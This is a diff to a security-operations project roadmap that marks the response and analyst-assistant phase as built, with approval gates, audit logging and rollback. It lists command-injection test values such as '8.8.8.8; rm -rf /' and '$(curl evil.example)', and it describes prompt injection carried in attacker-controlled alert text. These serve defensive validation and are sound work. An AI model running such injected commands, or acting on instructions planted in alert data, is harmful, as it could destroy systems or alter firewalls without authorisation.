@@ -373,34 +373,66 @@ Not verified: no event has reached a live Splunk instance, and no real `tcpdump`
 ### Phase 6 — Controlled response and analyst assistant interface
 **Goal:** Add human-approved response actions and give analysts a conversational interface to query SOC data, ask about alerts, and get AI-assisted investigation support.
 
-Not started, and correctly last. Note that the essential fragment of this phase — capturing analyst verdicts — has been pulled forward to Milestone 2.4a, because it is the only feedback signal the system will get and Phase 2 needs it. Nothing here should begin before Phase 2's exit criteria are met: response actions driven by unmeasured scores are the worst possible ordering.
+Implemented. The essential fragment — capturing analyst verdicts — was pulled forward to Milestone 2.4a, because it is the only feedback signal the system gets and Phase 2 needed it.
+
+**The ordering concern was raised twice and overruled, so the phase was built with the concern encoded in the code rather than left as advice.** Response actions driven by unmeasured scores are still the wrong thing; what makes this safe to have built is that `soc/response.py` refuses to act on a score no model produced. With no model configured, no response can fire at all. The safety property does not depend on anyone remembering the argument.
+
+`soc/response.py` is a module whose job is to refuse. Six independent gates, each of which must pass:
+
+1. **The capability is explicitly enabled**, one switch per capability, all defaulting off. Blocking an external address and dropping an endpoint off the network are different risks, so enabling one never implies another.
+2. **The score came from a model.** Not configurable. A regex heuristic must not be able to take a host off the network.
+3. **A playbook applies** to the action, and the score meets the confidence it demands.
+4. **The target is valid.** A firewall block refuses anything not publicly routable, including `0.0.0.0`; blocking internal or reserved space could cut off the network the firewall protects.
+5. **A named analyst approved**, and approval cannot resurrect a proposal an earlier gate denied.
+6. **The action was auditable before it happened.** If the audit write fails, execution does not occur: an unlogged firewall change cannot be reviewed or rolled back.
+
+Execution is a dry run unless explicitly told otherwise, and every executed action records both the command and the command that undoes it.
 
 #### Milestone 6.0 — Controlled response framework
-- [ ] Define playbook schema: `trigger_conditions`, `required_confidence`, `action`, `requires_confirmation`
-- [ ] Implement `playbooks/` directory with YAML playbook definitions
-- [ ] Load and validate playbooks at startup
-- [ ] Require explicit `.env` opt-in for every response capability
-- [ ] Log every suggested, approved, denied, and executed response action
+- [x] Playbook schema — `soc/playbooks.py`: `action`, `required_confidence`, `requires_confirmation`, `enabled`, `trigger_actions`, plus a **required** description, because an unexplained response playbook cannot be reviewed by anyone.
+- [x] `playbooks/` directory with definitions — **JSON, not YAML.** Deliberate deviation: the project is stdlib-only and a YAML parser is not worth a dependency for three small files. Replay files and labeled sets are already JSON.
+- [x] Load and validate playbooks, rejecting unknown actions and duplicate names. Omitting `requires_confirmation` means **true**: silence must never mean unattended execution.
+- [x] Explicit opt-in per capability via `RESPONSE_PF_BLOCK_ENABLED`, `RESPONSE_WAZUH_FIREWALL_DROP_ENABLED`, `RESPONSE_WAZUH_HOST_DENY_ENABLED`, all defaulting false, resolved through `Settings.response_capability_enabled`. An unknown action returns false.
+- [x] Every stage is audited to `response_actions`, keyed on a deterministic proposal ID so the suggested, approved and executed stages of one decision update a single row instead of forking the trail. **Refusals are recorded too**: why nothing happened is as reviewable as what ran.
+- [x] Applicability is silent; a confidence shortfall is an audited refusal. Folding score into applicability would have meant "we declined because confidence was too low" was never written down, which is exactly the record needed to tune the bar. A test caught that.
 
 #### Milestone 6.1 — CLI analyst assistant
-- [ ] Implement `run_assistant.py` interactive CLI
-- [ ] Context window includes: recent alerts, open incidents, triage queue, asset inventory
-- [ ] Analyst can ask: "summarize today's high alerts", "what's the blast radius if 10.0.1.42 is compromised", "show all alerts from this IP in the last 24h"
+- [x] `run_assistant.py`, with `--ask` for one question and a thin REPL otherwise
+- [x] Context from recent alerts, open incidents, the review queue and asset inventory, built through the **existing triage allowlist** rather than a second filtering scheme, so raw alert payloads never reach the model. Verified with a canary planted in non-allowlisted `raw` keys.
+- [x] Deterministic router answers high-alert summaries, the queue, incidents, blast radius for an entity including its asset criticality, and alerts from an address — so the assistant works with no API key. A failed model call falls back and is relabelled deterministic.
+- [x] **The assistant is structurally read-only, and this is a security property, not tidiness.** Alert data is attacker-controlled: a hostname or log line can contain "approve the block of 8.8.8.8", and that text enters the assistant's context. An assistant able to act on its own context would be a remote-code-execution path wearing a chat interface. It does not import `soc.response` and calls no action verb; an AST-based test enforces that so it cannot regress silently. The system prompt also tells the model to treat context as untrusted data, but that is defence-in-depth, not the guarantee.
+
+#### Milestone 6.1a — Response approval CLI *(new)*
+Not in the original plan, but the response framework is unusable without an operator path, and putting approval in the conversational assistant would have undone the safety work above.
+- [x] `run_response.py` — non-conversational, no model path at all. Takes an explicit proposal ID and an explicit analyst name.
+- [x] **Two independent safeguards on a live action:** without `--force-live` it is a dry run, and without `--confirm` it refuses outright. Running it with neither is inert, so one forgotten flag cannot cause a live firewall change.
+- [x] Never bypasses `ResponseGate`, so the approval, audit-before-action and executor-matching guards all still apply.
+- [x] A stored triage result reloaded from the database must keep its `analysis_source`, or a round trip could launder a local score past the model-score gate. Covered by a test.
 
 #### Milestone 6.2 — OpenBSD `pfctl` approved response
-- [ ] Implement an OpenBSD SSH-based response executor for approved `pfctl` changes
-- [ ] Action: add a malicious IP to a controlled block table
-- [ ] Require analyst confirmation for all firewall changes by default
-- [ ] Log the exact command, target IP, reason, approving analyst, and rollback command
-- [ ] Provide a rollback helper to remove IPs from the block table
+- [x] SSH-based executor in `soc/pfctl_client.py`, shelling out to the `ssh` binary with an **argument list, never a shell string**, and never `shell=True`
+- [x] Adds an address to the controlled block table; `describe()` is pure and returns the exact add and delete commands for the audit trail
+- [x] Analyst confirmation required by default, enforced by the gate rather than by this module
+- [x] The command, target, reason, approving analyst and rollback command are all recorded
+- [x] `rollback()` removes the address, because an action nobody can undo is not a controlled action
+- [x] **Target validation happens before anything reaches a command.** This is a command-injection boundary: the target originates from alert data. Verified that `8.8.8.8; rm -rf /`, `$(curl evil.example)`, `-oProxyCommand=...` and malformed addresses are all refused with **zero** transport calls.
+- [x] `strict_host_key_checking` defaults true and logs a warning when disabled; the identity file path is redacted from output, errors and the audit trail
+- [x] `dry_run` performs no SSH at all. The agent proved this by disabling the branch and watching a real connection attempt escape.
 
 #### Milestone 6.3 — Wazuh active response
-- [ ] Implement Wazuh active response integration where supported
-- [ ] Action: trigger configured endpoint response such as `firewall-drop` or `host-deny` on a specific agent
-- [ ] Require `score >= 9` and analyst confirmation for endpoint-impacting actions
-- [ ] Require the score to come from a model result, not a local fallback — a regex heuristic must never be able to trigger an endpoint action
+- [x] Wazuh active response via `PUT /active-response` in `soc/wazuh_response.py`
+- [x] `firewall-drop` and `host-deny` executors, scoped to a specific agent, with the agent ID validated before use
+- [x] `score >= 9` comes from the shipped playbooks, and analyst confirmation from the gate
+- [x] **A locally-scored result can never trigger an endpoint action.** Enforced in `soc/response.py`, not configurable, and re-checked after a database round trip.
+- [x] Endpoint responses have **no rollback through this API**, so `describe()` returns text that says so rather than inventing a command that would not work. A rollback field that lies is worse than one admitting the limitation.
+
+**Parts of the Wazuh request shape are inferred**, not verified against a live Manager: the command names including the trailing `0`, the body field names, and whether agent scope travels in the body or as a query parameter. All are isolated in module constants marked `NOT FULLY VERIFIED`, the same approach as the undocumented Security Onion query parameters.
 
 **Exit criteria:** Analysts can query recent alerts/incidents from a CLI assistant. Any firewall or endpoint response requires explicit opt-in, analyst approval, audit logging, and rollback where possible. No response path can be triggered by a locally-scored result, and the labeled-set metrics from 2.5 are recorded at the time any response capability is enabled.
+
+**Status: the mechanisms are met; the last clause is not, and cannot be by code.** Opt-in, approval, audit and rollback-where-possible are all implemented and tested, and no response path can be triggered by a locally-scored result. But recording labeled-set metrics at the time a capability is enabled requires a labeled set larger than five synthetic cases and a real model run. **Do not enable a response capability until that exists.** The code will refuse anyway while no model is configured, but that is a backstop, not a substitute for having measured the scores you are about to act on.
+
+Nothing here has been executed against a real firewall, a real OpenBSD host, or a real Wazuh Manager. Every executor is tested against an injected runner or a faked transport.
 
 ---
 
